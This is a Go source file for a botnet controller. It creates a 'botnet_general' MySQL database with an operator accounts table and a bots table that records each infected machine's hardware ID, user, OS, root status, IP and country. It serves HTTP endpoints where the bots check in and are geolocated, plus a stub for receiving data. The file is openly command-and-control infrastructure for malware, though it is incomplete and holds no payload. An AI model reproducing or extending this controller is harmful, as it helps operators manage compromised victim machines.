package main

import (
	"bufio"
	"crypto/sha512"
	"database/sql"
	"encoding/json"
	"filter"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

func ReadInput() string {
	var i *bufio.Reader
	var s string
	i = bufio.NewReader(os.Stdin)
	s, _ = i.ReadString('\n')
	s = strings.Trim(s, "\r\n")
	return s
}

func GetCountryCode(ip string) string {
	type Details struct {
		Ip, CountryCode, CountryName, RegionCode, RegionName, City, Zip, Lat, Long, Metro, AreaCode string
	}
	var holder Details
	var body string
	var bodyB []byte
	var e error
	var response *http.Response
	response, e = http.Get("http://freegeoip.net/json/" + ip)
	if e != nil {
		log.Println(e)
		return "--"
	}
	bodyB, e = ioutil.ReadAll(response.Body)
	response.Body.Close()
	if e != nil {
		log.Println(e)
		return "--"
	}
	body = string(bodyB)
	dec := json.NewDecoder(strings.NewReader(body))
	for {
		if e = dec.Decode(&holder); e == io.EOF {
			break
		} else if e != nil {
			log.Println(e)
			return "--"
		}
		return string(holder.CountryCode)
	}
	return "--"
}

func StandardReq(w http.ResponseWriter, r *http.Request) {
	var hwid, user, os string = r.FormValue("hwid"), r.FormValue("user"), r.FormValue("os")
	fmt.Printf("---INCOMING REQUEST--\r\n\r\nhwid=" + hwid + "\r\nuser=" + user + "\r\nos=" + os + "\r\nIP=" + r.RemoteAddr + "\r\nCountryCode=" + GetCountryCode(r.RemoteAddr) + "\r\n\r\n")
}

func RecieveData(w http.ResponseWriter, r *http.Request) {
	return
}

func PrepareDB(db *sql.DB) {
	var e error
	var username, password string
	_, e = db.Exec("CREATE DATABASE `botnet_general`")
	if e != nil {
		log.Fatal(e)
	}
	_, e = db.Exec("CREATE TABLE `botnet_general`.`accounts`(`id` INT NOT NULL AUTO_INCREMENT,`username` VARCHAR(255),`password` VARCHAR(255),PRIMARY KEY(`id`))")
	if e != nil {
		log.Fatal(e)
	}
	fmt.Printf("Enter a primary username: ")
	username = ReadInput()
	fmt.Printf("Enter a primary password: ")
	password = ReadInput()
	hasher := sha512.New()
	hasher.Write([]byte(password))
	password = fmt.Sprintf("%x", string(hasher.Sum(nil)))
	filter.SQLInjection(&username)
	_, e = db.Exec("INSERT INTO `botnet_general`.`accounts`(`username`,`password`) VALUES('" + username + "','" + password + "')")
	if e != nil {
		log.Fatal(e)
	}
	_, e = db.Exec("CREATE TABLE `botnet_general`.`bots`(`id` INT NOT NULL AUTO_INCREMENT,`hwid` VARCHAR(255),`username` VARCHAR(255),`os` VARCHAR(255),`root` VARCHAR(255),`ip` VARCHAR(255),`country` VARCHAR(255), PRIMARY KEY (`id`))")
	if e != nil {
		log.Fatal(e)
	}
	fmt.Println("Setup successful!")
	return
}

func ValidateLaunch() {
	login, e := ioutil.ReadFile("SQLLogin.txt")
	if e != nil {
		log.Fatal(e)
	}
	db, e := sql.Open("mysql", string(login)+"/")
	if e != nil {
		log.Fatal(e)
	}
	e = db.QueryRow("SELECT `SCHEMA_NAME` FROM `information_schema`.`SCHEMATA` WHERE `SCHEMA_NAME`='botnet_general'").Scan(new(string))
	if e == sql.ErrNoRows {
		PrepareDB(db)
	} else if e != nil {
		log.Fatal(e)
	} else {
		return
	}
}

func main() {
	ValidateLaunch()
	log.Println("Botnet controller running on port 80")
	http.HandleFunc("/request/", StandardReq)
	http.HandleFunc("/recieve/", RecieveData)
	http.ListenAndServe(":80", nil)
}
